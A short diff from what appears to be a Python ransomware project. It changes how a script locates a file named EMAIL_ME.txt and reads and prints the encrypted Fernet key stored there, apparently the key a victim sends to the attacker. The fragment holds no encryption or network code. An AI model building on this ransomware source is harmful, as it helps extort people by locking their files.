@@ -6,13 +6,13 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
 # Local Imports
-from RansomWare import DESKTOP_PATH, PROJECT_NAME
+from RansomWare import PROJECT_PATH
 
 sysRoot = os.path.expanduser('~')
 desktop = f"{sysRoot}\\Desktop"
 print(sysRoot)
 
-with open(f'{DESKTOP_PATH}\\{PROJECT_NAME}\\EMAIL_ME.txt', 'rb') as f:
+with open(f'{PROJECT_PATH}\\EMAIL_ME.txt', 'rb') as f:
     enc_fernet_key = f.read()
     print(enc_fernet_key)
 
